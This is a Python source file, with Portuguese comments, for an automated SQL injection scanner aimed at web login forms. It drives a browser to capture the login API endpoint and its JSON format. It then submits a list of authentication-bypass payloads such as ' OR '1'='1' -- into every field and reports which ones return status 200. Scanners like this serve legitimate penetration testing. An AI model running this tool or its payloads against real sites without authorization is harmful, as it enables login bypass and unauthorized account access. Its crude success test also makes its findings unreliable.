import requests
import time
from playwright.sync_api import sync_playwright

from src.recon import close_modals_and_popups


class SQLInjectionScanner:
    """Testa vulnerabilidades de injeção de SQL em formulários de login."""

    def __init__(self, login_page_url):
        self.login_page_url = login_page_url
        self.api_info = {}
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' ({",
            "' OR '1'='1' /*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a' -- ",
            "' OR 'a'='a' ({",
            "' OR 'a'='a' /*",
        ]
        self.playwright = None
        self.browser = None

    def __enter__(self):
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.browser:
            self.browser.close()
        if self.playwright:
            self.playwright.stop()

    def _espionar_requisicao(self, request):
        """Listener que captura a URL da API de login e o formato do JSON."""
        if request.method == "POST" and any(
            keyword in request.url for keyword in ["login", "signin", "auth"]
        ):
            print(f"[!] Alvo da API encontrado: {request.method} {request.url}")
            self.api_info["url"] = request.url
            self.api_info["json_format"] = request.post_data_json

    def _discover_api_endpoint(self):
        """Navega e tenta logar para descobrir o endpoint da API."""
        print("Iniciando descoberta do endpoint de login...")
        page = self.browser.new_page()
        page.on("request", self._espionar_requisicao)
        page.goto(self.login_page_url)
        close_modals_and_popups(page)

        try:
            page.locator("input[name='email']").fill("test@example.com")
            page.locator("input[name='password']").fill("password")
            page.locator("input[name='password']").press("Enter")
            time.sleep(5)  # Aguarda a requisição ser capturada
        except Exception as e:
            print(f"Não foi possível preencher o formulário: {e}")
        finally:
            page.close()

        return self.api_info.get("url") is not None

    def _test_login(self, url, json_login):
        """Realiza o POST de login e retorna o response."""
        try:
            return requests.post(url, json=json_login)
        except requests.exceptions.RequestException as e:
            print(f"Erro na requisição: {e}")
            return None

    def run_scan(self):
        """Executa a varredura completa de injeção de SQL."""
        print("--- Iniciando Varredura de Injeção SQL ---")
        if not self._discover_api_endpoint():
            print("Não foi possível encontrar o endpoint da API de login. Abortando.")
            return

        api_url = self.api_info["url"]
        json_format = self.api_info["json_format"]
        successful_payloads = []

        print(f"Testando {len(self.payloads)} payloads em {len(json_format.keys())} campos...")

        for field in json_format.keys():
            for payload in self.payloads:
                json_payload = json_format.copy()
                json_payload[field] = payload

                response = self._test_login(api_url, json_payload)

                if response and response.status_code == 200:
                    try:
                        response_json = response.json()
                        # Critério de sucesso simples: status 200 e resposta JSON
                        print(f"[+] Payload bem-sucedido! Campo: {field}, Payload: {payload}")
                        successful_payloads.append((field, payload, response_json))
                    except ValueError:
                        print(f"[!] Resposta 200 com corpo não-JSON para o payload: {payload}")

        print("\n--- Varredura de Injeção SQL Concluída ---")
        if successful_payloads:
            print("Payloads de injeção SQL que resultaram em login (status 200):")
            for key, payload, response_json in successful_payloads:
                print(f"  - Campo: {key}\n    Payload: {payload}\n    Resposta: {response_json}")
        else:
            print("Nenhum payload de injeção SQL foi bem-sucedido.")